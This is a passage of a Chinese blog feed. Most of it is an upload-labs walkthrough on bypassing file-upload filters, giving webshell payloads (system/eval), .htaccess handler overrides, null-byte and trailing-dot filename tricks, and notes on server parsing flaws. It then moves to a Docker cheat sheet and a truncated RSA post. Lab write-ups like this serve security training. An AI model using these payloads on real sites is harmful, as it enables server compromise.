class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br></pre></td></tr></table></figure><p>比刚才的黑名单多了不少，但是<code>.htaccess</code>还是没有过滤，可以重写文件解析规则绕过，上传一个<code>.htaccess</code>，文件内容如下，就是在upload目录下匹配gg.jpg的文件并以php文件执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;gg.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJPput.png" alt="kJPput.png"></p><p>然后再上传一个名字为gg.jpg的脚本</p><p><img src="https://s2.ax1x.com/2019/02/04/kJVbM4.png" alt="kJVbM4.png"></p><p>然后访问成功执行</p><p><img src="https://s2.ax1x.com/2019/02/04/kJZgfK.png" alt="kJZgfK.png"></p><h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>这一题里面多过滤了<code>.htaccess</code>，如何绕过呢？</p><p><img src="https://s2.ax1x.com/2019/02/04/kJmaqJ.png" alt="kJmaqJ.png"></p><p>对比一下代码可以知道，可以使用大小写绕过，因为这里把原来转换成小写的那一部分给删掉了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJmBI1.png" alt="kJmBI1.png"></p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>这一关比第五关少了这样的一句代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>所以可以后缀名+空格的形式去绕过</p><p><img src="https://s2.ax1x.com/2019/02/04/kJnO1K.png" alt="kJnO1K.png"></p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>对比第6题的代码可以发现少了下面一句代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure><p>既然没有对文件最后的点做过滤，可以尝试以后缀名加上点的形式去绕过</p><p><img src="https://s2.ax1x.com/2019/02/04/kJKZ26.png" alt="kJKZ26.png"></p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>这一题的代码比上一次少了下面这一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>这个是关于windows下文件的流特性，可以参考一下这篇文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.owasp.org/index.php/Windows_::DATA_alternate_data_stream</span><br></pre></td></tr></table></figure><p>这样一来就是说这东西应该只能在Windows下运行了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ1FOK.png" alt="kJ1FOK.png"></p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>这一关像是前几关的组合拳，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>可以遵循着他的步骤去实现自己的payload，可以这样设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.php. .</span><br></pre></td></tr></table></figure><p>这样一来检测到最后的文件名是<code>4.php.</code>这样就相当于第七关了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ1zB8.png" alt="kJ1zB8.png"></p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>关键过滤的代码就这两句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">   $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br></pre></td></tr></table></figure><p>跟我上一关讲的SQL注入的类型差不多，就是双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.pphphp</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJ3yKP.png" alt="kJ3yKP.png"></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>关键的代码在于这里的’save_path’是一个可控的变量，但是后面还拼接上一个后缀名，也需要绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p>这个时候可以使用%00截断，但这东西有点过气了，因为需要两个条件</p><ol><li>php版本小于5.3.4</li><li>php的magic_quotes_gpc为OFF状态</li></ol><p>如果要完成这一个题目就必须要实现上面的两个条件，但是现在都PHP7了，这东西也就很少见了，满足上面的条件的时候php就是把它当成结束符，后面的数据直接忽略，这也导致了很多的问题，文件包含也可以利用这一点</p><p>所以如果要绕过，我们可以这样去实现，另save_path等于下面的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/4.php%00</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcCUH.png" alt="kJcCUH.png"></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>这里的源代码就改了一点点，就是把get改为post类型，一样的方式绕过，只不过这里需要在二进制里面修改%00，因为post不会像get对%00进行自动解码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcP5d.png" alt="kJcP5d.png"></p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>从这一关开始要求上传图片马，但是没有办法直接执行图片马，需要另外的方法去实现一般是加上php伪协议去getshell，常见的有phar，zip等等<br>如果想要看到详细的效果可以写一下简单的脚本放在upload目录下即可，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">include</span> $_GET[file];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最最最简单的图片马直接一条命令即可生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg /b + shell.php /a webshell.jpg</span><br></pre></td></tr></table></figure><p>上传一个图片马，内容如下，可以看到里面有脚本语言</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcYrT.png" alt="kJcYrT.png"></p><p>把该图片上传上去，尝试文件包含，成功回显</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcaa4.png" alt="kJcaa4.png"></p><p>这里可以发现源代码只是用了unpack这一个函数去实现对于php前两个字节的检测，也就是只是对文件头做检测。。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);</span><br></pre></td></tr></table></figure><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>类似上一个题目,获取了图片的相关的大小及类型，并验证是否时刻上传的图片，同样可以使用文件头的方式绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br><span class="line">$ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJchid.png" alt="kJchid.png"></p><p>说明info[2]是一个文件的类型，同样的方法也是可以绕过的</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcrxx.png" alt="kJcrxx.png"></p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>换了一个获取图片信息的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcLdg.png" alt="kJcLdg.png"></p><p>跟pass-13一样的绕过方法</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>这一关对后缀名和文件类型啥的都进行了很严格的控制，而且在后面还对图片进行了二次编译</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">$im = imagecreatefromjpeg($target_path);</span><br></pre></td></tr></table></figure><p>这一个题目跟上次校赛的题目思路一致，寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传，下载下来后发现这一部分插入代码的没变但是其他部分都变了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJgrkQ.png" alt="kJgrkQ.png"></p><p>尝试文件包含，后面怎么利用就不多说了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJgq6x.png" alt="kJgq6x.png"></p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>这一关是条件竞争的问题，查看源代码就会发现你需要在缓存文件转移到别的目录的时候，赶紧访问它，这里可以使用burp去发包，可以把文件内容改成下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $c=fopen(<span class="string">'./cmd.php'</span>,<span class="string">'w'</span>);fwrite($c,<span class="string">'&lt;?php system($_GET["f"]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者这样，反正就是为了写文件进去就对了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd]?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJ2d3R.png" alt="kJ2d3R.png"></p><p>两个burp跑一跑，就会在该文件夹下面产生新的文件了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ2Du6.png" alt="kJ2Du6.png"></p><p>访问成功</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ2W8A.png" alt="kJ2W8A.png"></p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>同样的也是一个条件竞争的问题，看一下源代码可以发现这里使用类去实现相关方法，包括查看文件后缀名，大小等等</p><p>这里面的问题存在于代码将上传文件更改名字的时候给了个时间差，让我们可以去实现这个竞争效果，同样的方法，不都说</p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>这一关正常做法应该是CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称</p><p>上传的文件名用0x00绕过。改成<code>xx.php【二进制00】.x.jpg</code></p><p>但是发现了一种更有意思的解法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html</span><br></pre></td></tr></table></figure><p>简单来说就是<code>move_uploaded_file</code>底层会调用<code>tsrm_realpath</code>函数导致，递归删除文件名最后的<code>/.</code>导致绕过了后缀名检测，同样类似的函数还有<code>file_put_content()</code>，反正打开文件流都会有类似的操作</p><p>所以可以这样子去绕过<code>6.php/.</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kJTg56.png" alt="kJTg56.png"></p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>这个题目用了数组+/.的方式去绕过，因为源代码里面含有这样的两句代码，成了关键得绕过的地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">                    $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>这同样我们就需要满足两个条件，第一个是先得保证另外修改的名字需要满足是数组的条件，所以我们可以抓包构造数组，第二点由于后面filename构成的过程中由于<code>$file[count($file) - 1]</code>的作用，导致<code>$file[1] = NULL</code>，所以构造文件名后相当于直接就是<code>xx.php/.</code>，根据上面一题的知识，可以直接在<code>move_uploaded_file</code>函数的作用下可以将<code>/.</code>忽略，因此还是可以上传成功的。</p><p>因此save_name变量的两个值分别是<code>xx.php/</code>，另外一个值是<code>jpg</code>，其实从代码审计的角度上看，还是可控变量导致这样的后果</p><p><img src="https://s2.ax1x.com/2019/02/13/k0OSM9.png" alt="k0OSM9.png"></p><p><img src="https://s2.ax1x.com/2019/02/13/k0O9q1.png" alt="k0O9q1.png"></p><h3 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h3><p>upload-labs里面的关卡个人感觉只是针对文件上传这个漏洞去弄的，可以梳理一下，可以根据上面的绕过写一个fuzz字典XD</p><ol><li>前端的绕过</li><li>后缀名，文件类型，文件头的绕过</li><li>Windows下::$DATA的问题</li><li>图片经过二次渲染的绕过</li><li>根据代码跳进进行的绕过</li><li>条件竞争</li></ol><p>还有其他的中间件问题导致的解析漏洞没有展现出来，可能环境配置比较麻烦，想了很久，我怕自己忘了，还是自己总结一下，以后可以拿出来看一下</p><h4 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h4><p><code>IIS 6.0</code>解析利用方法有三种：<br>1.目录解析<br>建立xx.asp为名称的<code>文件夹</code>，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析<br>2.文件解析<br>后缀解析：/xx.asp;.jpg    /xx.asp:.jpg(此处需抓包修改文件名)<br>3.默认解析<br>IIS6.0 默认的可执行文件除了asp还包含这三种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/xxx.asa</span><br><span class="line">/xxx.cer</span><br><span class="line">/xxx.cdx</span><br><span class="line">/xxx.apsx</span><br></pre></td></tr></table></figure><h4 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h4><p>在正常图片URL后添加 /.php，可以解析为php</p><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全</p><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3则会被解析为php</p><p>最近在出题的时候在apache 2.1.x的版本就可以用test.php.jpg直接就可以getshell了，真尴尬。</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>Nginx &lt;<code>8.03</code>畸形解析漏洞<br>直接在正常图片URL后添加<code>/.php</code><br>Nginx &lt;=<code>0.8.37</code><br>在Fast-CGI<code>关闭</code>的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p><p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;闲来无聊，把upload-labs所有的关卡都刷一遍
    
    </summary>
    
      <category term="文件上传" scheme="0verwatch.top/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
      <category term="文件上传" scheme="0verwatch.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Dockerfile编写</title>
    <link href="0verwatch.top/Dockerfile-writing.html"/>
    <id>0verwatch.top/Dockerfile-writing.html</id>
    <published>2019-01-22T06:47:05.000Z</published>
    <updated>2019-01-22T09:57:25.822Z</updated>
    
    <content type="html"><![CDATA[<p>最近在出题目，Dockerfile有些东西忘记了<a id="more"></a>，重新回顾一下</p><h4 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h4><p>新建并启动容器：docker run [opotions] IMAGE [COMMAND] [Args..]</p><p>-i : 交互式运行并且与-t相互运行</p><p>-t ：新建一个终端</p><p>–name：直接跟新建的名字</p><p>docker ps:查看所有正在运行的容器 -a查看历史运行过的容器 -l 上次运行的 -n 加个数字显示最近几次创建的容器 -q 显示容器编号  可以以此删除容器</p><p>退出容器：两种：1. exit  容器停止退出 2. ctrl+P+Q  容器不停止并退出</p><p>启动容器：docker start 容器ID</p><p>重启容器： docker restart 容器ID</p><p>停止容器： docker stop 容器ID或名字</p><p>强制停止容器：docker kill 容器ID或名字</p><p>删除已经停止的容器：docker rm 容器ID或名字 没有停止的加个 -f</p><p>删除全部 docker rm -f  $(docker ps -aq)</p><p>-P：随机端口映射</p><p>-p：指定端口映射，有以下四种格式</p><p>ip:hostPort:containerPort</p><p>ip:containerPort</p><p>hostPort:containerPort</p><p>contarinerPort</p><p>启动守护容器： -d 后台运行并返回ID</p><p>但是用这种方案启动的docker使用ps命令是看不到其容器进程，因为他已经退出了，Docker后台运行就必须有一个前台进程，如果不是那些一直挂气的命令如(top,tail)，就是会自动启动的</p><p>查看容器日志 docker logs -f -t –tail 容器ID -t时间戳 -f跟随最新日志打印 –tail跟数字表示最后几条</p><p>查看容器内进程：docker top 容器名字、ID</p><p>查看容器内部的细节：docker inspect 容器ID</p><p>进入正在运行的容器： docker exec -it 容器ID /bin/bash（好像一定要写，试了一下，不写进不去，写不写都可以，也可以是其他命令，则输出命令显示的结果） </p><p>或者是docker attach 容器ID，对比一下可以知道exec功能更多</p><p>从容器内拷贝文件到主机上：docker cp 容器ID:容器里面的路径 主机本地路径(可以改一下名字)</p><h4 id="Docker镜像"><a href="#Docker镜像" class="headerlink" title="Docker镜像"></a>Docker镜像</h4><p>是什么？联合文件系统   最大好处 ？共享资源</p><p>正常的命令就不说了，看文档就可以。</p><p>docker commit 提交容器副本使之成为一个新的镜像</p><p>docker commit -m 提交描述的信息 -a 作者 容器ID  要创建的目标镜像名：[标签名]</p><p>说明可反着来</p><h5 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h5><p>直接命令添加 ：docker run -it -v  /宿主机绝对路径目录:/容器内目录 镜像名</p><p>容器和宿主机之间数据共享</p><p>带权限的docker run -it -v  /宿主机绝对路径目录:/容器内目录:ro 镜像名</p><p>Dockerfile添加</p><p>可在Dockerfile中使用VOLUMN指令来给镜像添加一个或多个数据卷</p><p>新建一个Dockerfile然后通过build运行新建镜像</p><p>docker build -f  文件路径 -t  自己的名字空间/centos  .</p><p>要找默认地址用inspect命令查看</p><p>容器数据共享 –volumns-from 各自添加都能共享，而且注意一下这点，数据卷的生命周期一直到没有容器使用它为止</p><h4 id="Dockerfile解析"><a href="#Dockerfile解析" class="headerlink" title="Dockerfile解析"></a>Dockerfile解析</h4><p>每条保留字指令并且后面至少一个参数，而且是从上往下顺序执行，#表示注释</p><p>每条指令都会创建新的镜像层，并对镜像进行提交</p><p>保留字指令</p><p>FROM 基础镜像 </p><p>MAINTAINER 镜像维护者的姓名和邮箱</p><p>RUN 容器构建时需要运行的命令</p><p>EXPOSE 当前容器对外暴露的端口号</p><p>WORKDIR 指定创建容器后，终端默认登录进来的工作目录，一个落脚点</p><p>ENV 用来在构建镜像过程中设置环境变量</p><p>ADD 将宿主机目录下的文件拷贝进京向且ADD命令会自动处理URL和解压tar包</p><p>COPY 类似ADD拷贝文件和目录到镜像中1.COPY src dest 2.COPY [“src”,”dest”]</p><p>VOLUME 容器数据卷，用于保存数据</p><p>CMD 可以有多个命令，但会被docker run之后替换最后一个命令，而且不能追加某个命令的选项</p><p>ENTRYPOINT 跟CMD类似，但是可以追加。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在出题目，Dockerfile有些东西忘记了
    
    </summary>
    
      <category term="环境部署" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="环境部署" scheme="0verwatch.top/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>RSA原理及Python实现</title>
    <link href="0verwatch.top/RSA-python.html"/>
    <id>0verwatch.top/RSA-python.html</id>
    <published>2019-01-12T08:46:30.000Z</published>
    <updated>2019-01-12T08:47:31.177Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>RSA是第一个安全，实用的公钥加密算法，已成为国家标准，是目前应用广泛的公钥加密体制，RSA的基础是数论的欧拉定理<a id="more"></a>，它的安全性依赖于大整数因子分解的困难性，因为加解密次序可换，可用于加解密，可用于设计数字签名体制。</p><h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><ol><li>选取两个安全的大素数p和q(其长度要足够长至少要是1024位)</li><li>计算乘积n = p <em> q, 计算phi(n) = (p-1)</em>(q-1)，其中phi(n)为n的欧拉函数</li><li>随机选取整数e，作为公钥，要求满足gcd(e, phi(n)) =1 ,即e与phi(n)互素</li><li>用扩展欧几里得算法计算私钥d。满足d * e=1(mod phi(n))，e和n是公钥，d是秘钥。 </li></ol><p>我的代码是固定了公钥为65537，产生的两个大素数是通过Miller-Rabin算法进行塑素性检测并且产生素数p还有q。</p><h3 id="核心代码及分析"><a href="#核心代码及分析" class="headerlink" title="核心代码及分析"></a>核心代码及分析</h3><p>首先是先产生两个大素数p和q，这里的核心代码是下面的代码，这里是根据消息的长度去产生p和q，怎么知道这两大数是个素数呢？就得通过Miller-Rabin概率素数测试算法，先判断一次费马小定理，满足的话就有可能是一个素数，然后再经过5次的Miller-Rabin素性测试，这样就可以很大概率说明其是素数，两次调用这样的过程就可以产生p和q。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#辗转相除法求最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; b: a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    判断一个数是否为素数</span></span><br><span class="line"><span class="string">    厄拉托塞师除法 </span></span><br><span 